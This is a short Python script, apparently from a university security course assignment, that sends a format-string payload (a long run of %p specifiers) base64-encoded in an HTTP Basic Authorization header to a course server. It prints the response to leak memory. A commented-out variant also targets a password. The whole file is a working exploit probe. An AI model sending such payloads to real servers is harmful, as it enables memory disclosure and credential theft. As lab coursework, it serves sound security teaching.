import requests
import base64

# quest 1
# payl = "%p %d %p %p %p %p %s %p:psswd"

payl = "%p %p %p %p %p %p %p %p %p  %p %p %p %p %p %p %p %p  %p %p %p %p %p %p %p %p  %p %p %p %p %p %p %p %p  %p %p %p %p %p %p %p %p  %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p"

headers = {"Authorization":"Basic " + base64.b64encode(payl.encode("utf-8")).decode("utf-8")}
response = requests.get("http://project-2.csec.chatzi.org:8000",headers = headers)


print(response.status_code)
print(response.headers)
print(response.text)